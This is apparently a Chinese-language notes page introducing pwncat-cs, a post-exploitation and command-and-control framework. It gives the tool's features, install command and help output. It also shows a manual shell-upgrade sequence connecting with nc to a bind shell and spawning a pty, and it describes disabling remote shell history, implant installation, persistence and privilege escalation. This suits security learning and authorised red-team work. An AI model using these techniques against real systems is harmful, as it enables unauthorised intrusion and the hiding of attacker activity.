# pwncat-cs

官网地址 --> [Github](https://github.com/calebstewart/pwncat)

## 简介

pwncat 是一个后渗透平台 ~~用于 Linux 目标~~. 它最初是作为基本绑定和反向 shell 的包装器，并从那里发展起来。它简化了常见的红队操作，同时从攻击者机器而不是目标上暂存代码。

pwncat 以前只支持Linux，但是最近做了很多工作来支持多平台。目前，**有对 Windows 目标的 alpha 支持**。有关如何在 Windows 目标上使用 pwncat 的详细信息，请参阅最新[文档](https://pwncat.readthedocs.io/en/latest)。

pwncat 拦截与远程 shell 的原始通信，并允许用户在远程主机上执行自动化操作，包括枚举、植入安装甚至权限提升。

收到连接后，pwncat 将设置一些常用配置以使用远程 shell。

* **在远程 shell 中禁用历史记录**
* 规范化 shell 提示
* 找到有用的二进制文件（使用`which`）
* 尝试为完整的交互式会话生成伪终端 (pty)

`pwncat`知道如何使用几种不同的方法生成 pty，并将交叉引用与先前枚举的可执行文件的方法。生成 pty 后，它将以原始模式设置控制终端，因此您可以以类似于`ssh`.

`pwncat`还将远程 pty 设置（例如行、列、`TERM`环境变量）与您的本地设置同步， 以确保 shell 与交互式应用程序（例如`vim`或 ）正确运行`nano`。

John Hammond 和我`pwncat`在 GRIMMCon 上发表了演讲。我们的演示文稿，可在[此处](https://www.youtube.com/watch?v=CISzI9klRkw)在 YouTube 上[找到](https://www.youtube.com/watch?v=CISzI9klRkw)。该视频演示了 API 和界面的早期版本。请参阅文档以获取最新用法和 API 文档！

<mark style="color:red;">**pwncat 在 Linux 上需要 Python 3.9+**</mark>

pwncat 是一个命令和控制框架，它将基本的反向或绑定 shell 变成一个功能齐全的开发平台。初始连接后，框架将探测远程系统以识别目标系统上本机可用的有用二进制文件。然后它将尝试在远程主机上启动一个伪终端并为您提供原始终端访问。

不过，pwncat 并不止于此。除了原始终端访问之外，pwncat 还可以在终端访问的同时以编程方式与远程主机交互。pwncat 为您提供了一个本地 shell 接口，它可以利用您的连接进行枚举、文件上传/下载、自动持久性安装甚至自动提权

## 使用原因

您可能熟悉使用反向 shell 获取原始终端访问权限的常用方法。它通常是这样的：

```bash
# 连接到远程绑定shell
nc 1.1.1.1 4444
# 生成远程伪终端
remote$ python -c "import pty; pty.spawn('/bin/bash')"
# Background your raw shell
remote$ C-z
# Set local terminal to raw mode
local$ stty raw -echo
# Foreground your remote shell
local$ fg
# You now have a full terminal that doesn't exit on C-c and
# supports keyboard shortcuts, history, graphical terminal
# applications, etc.
remote$
```

这很好用。然而，一段时间后，获得反向shell的附加步骤很费力**。**<mark style="color:red;">**此外，在获得原始访问权限之前不小心按“Cc”而丢失远程 shell 的风险很高**</mark>。这是这个项目的最初灵感。

## 安装

> 这里推荐虚拟环境安装，Python3 虚拟环境安装见 --> [链接](../../bian-cheng-yu-yan/python/zi-yuan/python-xu-ni-huan-jing.md)

```bash
$ pip install pwncat-cs
```

```bash
$ pwncat-cs --help
usage: pwncat-cs [-h] [--version] [--download-plugins] [--config CONFIG] [--ssl] [--ssl-cert SSL_CERT]
                 [--ssl-key SSL_KEY] [--identity IDENTITY] [--listen] [--platform PLATFORM] [--port PORT] [--list]
                 [[protocol://][user[:password]@][host][:port]] [port]

启动交互式 pwncat 会话，并可选择通过已知平台和通道类型连接到现有受害者。 此入口点还可用于列出先前目标上的已知植入程序。

positional arguments:
  [protocol://][user[:password]@][host][:port]
                        Connection string describing victim
  port                  支持 netcat 样式语法的备用端口号

optional arguments:
  -h, --help            show this help message and exit
  --version, -v         Show version number and exit
  --download-plugins    预下载所有 Windows 内置插件并立即退出
  --config CONFIG, -c CONFIG
                        自定义配置文件（默认：./pwncatrc）
  --ssl                 使用 SSL 连接或收听
  --ssl-cert SSL_CERT   SSL 加密侦听器 (PEM) 的证书
  --ssl-key SSL_KEY     SSL 加密侦听器 (PEM) 的密钥
  --identity IDENTITY, -i IDENTITY
                        用于 SSH 身份验证的私钥
  --listen, -l          启用 `bind` 协议（支持 netcat 风格的语法）
  --platform PLATFORM, -m PLATFORM
                        要使用的平台名称（默认值：linux）
  --port PORT, -p PORT  指定端口以支持 netcat 样式语法的替代方法
  --list                列出具有远程连接功能的已安装植入物
```

## 基本用法

在 pwncat 中与受害者交互时有两种主要的操作模式：远程和本地。在任何给定时间，提示将包括`(local)`或`(remote)`以指示当前模式。使用本地模式时，您可以访问特定于 pwncat 的命令，例如上传、下载、使用、运行和退出。在远程模式下，您可以访问特定于平台的 shell 环境（例如 bash 或 powershell）。

要在这些模式之间切换，您可以使用`C-d`组合键。在远程模式下，此组合在发送到目标之前被 pwncat 拦截。如果需要将`C-d` 组合直接发送到目标，可以使用`C-k`前缀。前缀`C-d`或`C-k`with `C-k`将告诉 pwncat 将文字`C-d`或`C-k`序列发送到目标
